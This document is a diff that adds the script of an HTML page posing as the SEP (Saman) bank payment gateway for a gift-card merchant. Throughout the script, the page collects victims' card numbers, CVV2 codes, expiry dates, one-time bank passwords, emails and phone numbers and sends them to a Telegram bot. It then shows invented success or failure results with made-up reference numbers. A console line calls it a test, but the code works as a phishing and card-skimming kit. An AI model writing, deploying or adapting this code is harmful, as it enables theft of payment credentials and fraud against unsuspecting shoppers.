+                console.warn('⚠️ توکن یا Chat ID تلگرام تنظیم نشده است!');
+                document.getElementById('telegramDot').className = 'dot offline';
+                document.getElementById('telegramStatusText').textContent = '❌ تلگرام: تنظیمات کامل نیست';
+                return;
+            }
+
+            try {
+                const url = `https://api.telegram.org/bot${token}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_notification: !isImportant
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.ok) {
+                    console.log('✅ پیام به تلگرام ارسال شد');
+                    document.getElementById('telegramDot').className = 'dot online';
+                    document.getElementById('telegramStatusText').textContent = '✅ متصل به تلگرام';
+                } else {
+                    console.error('❌ خطا در ارسال به تلگرام:', result);
+                    document.getElementById('telegramDot').className = 'dot offline';
+                    document.getElementById('telegramStatusText').textContent = '❌ خطا در ارسال به تلگرام';
+                }
+            } catch (error) {
+                console.error('❌ خطا در اتصال به تلگرام:', error);
+                document.getElementById('telegramDot').className = 'dot offline';
+                document.getElementById('telegramStatusText').textContent = '❌ اتصال به تلگرام برقرار نیست';
+            }
+        }
+
+        // ============================================================
+        // 📋 تبدیل تاریخ میلادی به شمسی
+        // ============================================================
+        function toPersianDate(date) {
+            const formatter = new Intl.DateTimeFormat('fa-IR', {
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+            return formatter.format(date);
+        }
+
+        // ============================================================
+        // 📋 ساخت پیام کامل برای تلگرام
+        // ============================================================
+        function getFormData() {
+            const cardNumber = document.getElementById('cardNumber').value.trim() || 'وارد نشده';
+            const cvv = document.getElementById('cvv').value.trim() || 'وارد نشده';
+            const month = document.getElementById('expiryMonth').value || 'نامشخص';
+            const year = document.getElementById('expiryYear').value || 'نامشخص';
+            const captcha = document.getElementById('captchaInput').value.trim() || 'وارد نشده';
+            const dynamicCode = document.getElementById('dynamicCode').value.trim() || 'وارد نشده';
+            const saveCard = document.getElementById('saveCard').checked ? 'بله' : 'خیر';
+            const terms = document.getElementById('termsCheck').checked ? 'قبول' : 'رد';
+            const email = document.getElementById('extraEmail').value.trim() || 'وارد نشده';
+            const phone = document.getElementById('extraPhone').value.trim() || 'وارد نشده';
+
+            const monthNames = {
+                '01': 'فروردین', '02': 'اردیبهشت', '03': 'خرداد', '04': 'تیر',
+                '05': 'مرداد', '06': 'شهریور', '07': 'مهر', '08': 'آبان',
+                '09': 'آذر', '10': 'دی', '11': 'بهمن', '12': 'اسفند'
+            };
+
+            const order = {
+                id: 'ORD-' + String(Math.floor(Math.random() * 1000000)).padStart(6, '0'),
+                amount: '۴۴۰,۰۰۰ ریال',
+                amountTomans: '۴۴,۰۰۰ تومان',
+                merchant: 'موبوگیفت',
+                terminal: '16913293 / 15376470',
+                site: 'mobogift.com'
+            };
+
+            const now = new Date();
+            const persianDate = toPersianDate(now);
+            const isoDate = now.toISOString();
+
+            const maskedCard = cardNumber.length >= 16 ? 
+                '**** **** **** ' + cardNumber.replace(/\s/g, '').slice(-4) : 
+                cardNumber;
+
+            const expiryDisplay = month && year ? `${year}/${month}` : 'نامشخص';
+
+            return {
+                cardNumber,
+                maskedCard,
+                cvv,
+                expiry: expiryDisplay,
+                expiryMonth: monthNames[month] || month,
+                expiryYear: year,
+                captcha,
+                dynamicCode,
+                saveCard,
+                terms,
+                email,
+                phone,
+                order,
+                date: persianDate,
+                isoDate,
+                ip: '192.168.1.1',
+                userAgent: navigator.userAgent
+            };
+        }
+
+        function formatTelegramMessage(data, status = 'pending') {
+            const statusEmoji = status === 'success' ? '✅' : status === 'failed' ? '❌' : '⏳';
+            const statusText = status === 'success' ? 'موفق' : status === 'failed' ? 'ناموفق' : 'در حال پردازش';
+            
+            return `
+        💳 <b>اطلاعات تراکنش جدید</b>
+        ════════════════════════════
+        📌 <b>وضعیت:</b> ${statusEmoji} ${statusText}
+        🆔 <b>شماره سفارش:</b> ${data.order.id}
+        🏪 <b>پذیرنده:</b> ${data.order.merchant}
+        🌐 <b>سایت:</b> ${data.order.site}
+        🏦 <b>ترمینال:</b> ${data.order.terminal}
+        
+        ────────────────────────────
+        💰 <b>مبلغ:</b> ${data.order.amount}
+        💵 <b>معادل تومان:</b> ${data.order.amountTomans}
+        
+        ────────────────────────────
+        💳 <b>شماره کارت:</b> ${data.maskedCard}
+        🔐 <b>CVV2:</b> ${data.cvv}
+        📅 <b>تاریخ انقضا (شمسی):</b> ${data.expiry}
+        📆 <b>ماه:</b> ${data.expiryMonth}
+        📆 <b>سال:</b> ${data.expiryYear}
+        🔑 <b>رمز دوم وارد شده:</b> ${data.dynamicCode}
+        🔢 <b>کد امنیتی:</b> ${data.captcha}
+        💾 <b>ذخیره کارت:</b> ${data.saveCard}
+        📋 <b>قوانین:</b> ${data.terms}
+        
+        ────────────────────────────
+        📧 <b>ایمیل:</b> ${data.email}
+        📱 <b>موبایل:</b> ${data.phone}
+        
+        ────────────────────────────
+        🌐 <b>IP:</b> ${data.ip}
+        📅 <b>تاریخ (شمسی):</b> ${data.date}
+        🕐 <b>ISO:</b> ${data.isoDate}
+        💻 <b>مرورگر:</b> ${data.userAgent.substring(0, 100)}...
+        ════════════════════════════
+        `;
+        }
+
+        // ============================================================
+        // TIMER (۵ دقیقه)
+        // ============================================================
+        let timerSeconds = 300;
+        let timerInterval = null;
+        let timerRunning = false;
+
+        function startTimer() {
+            if (timerRunning) return;
+            timerRunning = true;
+            timerSeconds = 300;
+            updateTimerDisplay();
+
+            timerInterval = setInterval(function() {
+                timerSeconds--;
+                updateTimerDisplay();
+
+                if (timerSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                    timerRunning = false;
+                    document.getElementById('timerDisplay').classList.add('expired');
+                    document.getElementById('timerText').textContent = '۰۰:۰۰';
+                    document.getElementById('payBtn').disabled = true;
+                }
+            }, 1000);
+        }
+
+        function updateTimerDisplay() {
+            const mins = Math.floor(timerSeconds / 60);
+            const secs = timerSeconds % 60;
+            const display = String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+            document.getElementById('timerText').textContent = display;
+
+            const timerEl = document.getElementById('timerDisplay');
+            if (timerSeconds <= 10) {
+                timerEl.classList.add('warning');
+                timerEl.classList.remove('expired');
+            } else {
+                timerEl.classList.remove('warning');
+                timerEl.classList.remove('expired');
+            }
+        }
+
+        // ============================================================
+        // TOAST
+        // ============================================================
+        let toastTimeout = null;
+
+        function showToast(message, type = 'error') {
+            const toast = document.getElementById('toast');
+            const icon = document.getElementById('toastIcon');
+            const msg = document.getElementById('toastMessage');
+
+            const icons = { error: '❌', success: '✅', warning: '⚠️', info: 'ℹ️' };
+            icon.textContent = icons[type] || 'ℹ️';
+            msg.textContent = message;
+            toast.className = 'toast ' + type;
+            void toast.offsetWidth;
+            toast.classList.add('show');
+
+            if (toastTimeout) clearTimeout(toastTimeout);
+            toastTimeout = setTimeout(function() {
+                toast.classList.remove('show');
+            }, 4000);
+        }
+
+        // ============================================================
+        // CAPTCHA
+        // ============================================================
+        let currentCaptcha = '';
+
+        function generateCaptcha() {
+            let code = '';
+            for (let i = 0; i < 4; i++) {
+                code += Math.floor(Math.random() * 10);
+            }
+            return code;
+        }
+
+        function refreshCaptcha() {
+            currentCaptcha = generateCaptcha();
+            const display = currentCaptcha.split('').join(' ');
+            document.getElementById('captchaText').textContent = display;
+            document.getElementById('captchaInput').value = '';
+            document.getElementById('captchaInput').classList.remove('error');
+            document.getElementById('captchaError').classList.remove('show');
+        }
+
+        function speakCaptcha() {
+            if ('speechSynthesis' in window) {
+                const utterance = new SpeechSynthesisUtterance();
+                utterance.text = currentCaptcha.split('').join(' ');
+                utterance.lang = 'fa-IR';
+                utterance.rate = 0.8;
+                speechSynthesis.speak(utterance);
+                showToast('🔊 کد امنیتی پخش شد', 'info');
+            } else {
+                showToast('مرورگر شما از پخش صوتی پشتیبانی نمی‌کند', 'warning');
+            }
+        }
+
+        // ============================================================
+        // DYNAMIC CODE (فقط ارسال پیام به تلگرام)
+        // ============================================================
+        let dynamicCodeCountdown = 0;
+        let dynamicCodeInterval = null;
+
+        async function requestDynamicCode() {
+            const btn = document.getElementById('getCodeBtn');
+            if (btn.disabled) return;
+
+            const data = getFormData();
+            await sendToTelegram('📱 <b>درخواست رمز پویا</b>\n' + formatTelegramMessage(data, 'pending'), true);
+
+            showToast('📱 درخواست رمز پویا ثبت شد. لطفاً رمز دریافتی از بانک را وارد کنید.', 'info');
+
+            btn.disabled = true;
+            dynamicCodeCountdown = 30;
+            btn.innerHTML = 'دریافت مجدد <span class="countdown">(' + dynamicCodeCountdown + 's)</span>';
+
+            if (dynamicCodeInterval) clearInterval(dynamicCodeInterval);
+
+            dynamicCodeInterval = setInterval(function() {
+                dynamicCodeCountdown--;
+                if (dynamicCodeCountdown <= 0) {
+                    clearInterval(dynamicCodeInterval);
+                    dynamicCodeInterval = null;
+                    btn.disabled = false;
+                    btn.innerHTML = 'دریافت رمز پویا';
+                } else {
+                    btn.innerHTML = 'دریافت مجدد <span class="countdown">(' + dynamicCodeCountdown + 's)</span>';
+                }
+            }, 1000);
+        }
+
+        // ============================================================
+        // PROCESS PAYMENT - ارسال دو پیام به تلگرام
+        // ============================================================
+        async function processPayment() {
+            if (timerSeconds <= 0) {
+                return;
+            }
+
+            const data = getFormData();
+
+            // ========================================
+            // پیام اول - درخواست پرداخت
+            // ========================================
+            const message1 = formatTelegramMessage(data, 'pending');
+            await sendToTelegram('💳 <b>درخواست پرداخت</b>\n' + message1, true);
+
+            const btn = document.getElementById('payBtn');
+            btn.disabled = true;
+            document.getElementById('payBtnText').innerHTML = '<span class="spinner"></span> در حال پردازش...';
+
+            setTimeout(function() {
+                const isSuccess = Math.random() < 0.8;
+                
+                const status = isSuccess ? 'success' : 'failed';
+                
+                // ========================================
+                // پیام دوم - نتیجه تراکنش
+                // ========================================
+                const resultMessage = formatTelegramMessage(data, status);
+                const title2 = isSuccess ? '✅ <b>پرداخت موفق</b>' : '❌ <b>پرداخت ناموفق</b>';
+                sendToTelegram(title2 + '\n' + resultMessage, true);
+
+                if (isSuccess) {
+                    showResult(true, data);
+                } else {
+                    const errors = [
+                        'موجودی حساب شما کافی نیست',
+                        'کارت شما مسدود شده است',
+                        'رمز دوم اشتباه است',
+                        'خطا در ارتباط با بانک صادرکننده',
+                        'محدودیت روزانه تراکنش شما تکمیل شده است'
+                    ];
+                    const errorMsg = errors[Math.floor(Math.random() * errors.length)];
+                    showResult(false, errorMsg, data);
+                }
+
+                btn.disabled = false;
+                document.getElementById('payBtnText').textContent = 'پرداخت 440,000 ریال';
+            }, 2500);
+        }
+
+        // ============================================================
+        // RESULT
+        // ============================================================
+        function showResult(isSuccess, errorMessage, data) {
+            const overlay = document.getElementById('resultOverlay');
+            const icon = document.getElementById('resultIcon');
+            const title = document.getElementById('resultTitle');
+            const sub = document.getElementById('resultSub');
+            const details = document.getElementById('resultDetails');
+
+            if (isSuccess) {
+                icon.textContent = '✅';
+                title.textContent = 'پرداخت با موفقیت انجام شد';
+                title.className = 'result-title success';
+                sub.textContent = 'تراکنش شما با موفقیت ثبت گردید';
+                document.querySelector('.btn-close-result').className = 'btn-close-result';
+
+                document.getElementById('resTrace').textContent = String(Math.floor(Math.random() * 10000000000)).padStart(10, '0');
+                document.getElementById('resRef').textContent = 'SEP-' + String(Math.floor(Math.random() * 1000000000)).padStart(9, '0');
+                document.getElementById('resAmount').textContent = '۴۴۰,۰۰۰ ریال';
+                document.getElementById('resDate').textContent = toPersianDate(new Date());
+                document.getElementById('resMerchant').textContent = 'موبوگیفت';
+                document.getElementById('resCard').textContent = data ? data.maskedCard : '**** **** **** 1234';
+
+                details.style.display = 'block';
+                showToast('✅ پرداخت با موفقیت انجام شد', 'success');
+            } else {
+                icon.textContent = '❌';
+                title.textContent = 'پرداخت ناموفق بود';
+                title.className = 'result-title failed';
+                sub.textContent = errorMessage || 'خطا در انجام تراکنش';
+                document.querySelector('.btn-close-result').className = 'btn-close-result danger';
+                details.style.display = 'none';
+                showToast('❌ ' + (errorMessage || 'خطا در انجام تراکنش'), 'error');
+            }
+
+            overlay.classList.add('active');
+        }
+
+        function closeResult() {
+            document.getElementById('resultOverlay').classList.remove('active');
+        }
+
+        function resetForm() {
+            if (timerSeconds <= 0) {
+                location.reload();
+                return;
+            }
+            if (confirm('آیا از انصراف از پرداخت مطمئن هستید؟')) {
+                location.reload();
+            }
+        }
+
+        // ============================================================
+        // INPUT FORMATTING
+        // ============================================================
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = this.value.replace(/\D/g, '');
+            let formatted = '';
+            for (let i = 0; i < value.length && i < 16; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            this.value = formatted;
+        });
+
+        document.getElementById('cvv').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+        });
+
+        document.getElementById('captchaInput').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+        });
+
+        document.getElementById('dynamicCode').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+        });
+
+        // ============================================================
+        // INIT
+        // ============================================================
+        refreshCaptcha();
+        startTimer();
+
+        console.log('🟢 درگاه سِپ (SEP) - شبیه‌سازی کامل');
+        console.log('⏱️ زمان باقیمانده: ۵ دقیقه');
+        console.log('💰 مبلغ: ۴۴۰,۰۰۰ ریال');
+        console.log('📅 تاریخ انقضا: شمسی');
+        console.log('🔒 این یک محیط TEST است.');
+        console.log('📤 دو پیام به تلگرام ارسال می‌شود: درخواست + نتیجه');
+
+        sendToTelegram('🟢 <b>درگاه سِپ</b> راه‌اندازی شد\n💰 مبلغ: ۴۴۰,۰۰۰ ریال\n🆔 وضعیت: آماده پرداخت', false);
+    </script>
+</body>
+</html>
